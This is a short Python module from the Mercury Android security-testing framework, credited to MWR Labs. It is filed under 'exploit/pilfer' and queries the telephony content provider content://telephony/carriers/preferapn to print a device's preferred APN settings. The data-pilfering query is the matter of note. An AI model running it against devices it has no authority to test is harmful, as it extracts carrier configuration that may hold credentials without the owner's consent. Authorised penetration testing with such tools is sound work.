from merc.lib.modules import Module


class GetApn(Module):
    """Description: Read from content://telephony/carriers/preferapn
Credit: Rob M - MWR Labs"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "general"]

    def execute(self, session, _arg):

        request = {}
        request['Uri'] = "content://telephony/carriers/preferapn"
        request['showColumns'] = "true"

        print session.executeCommand("provider", "query", request).getPaddedErrorOrData()
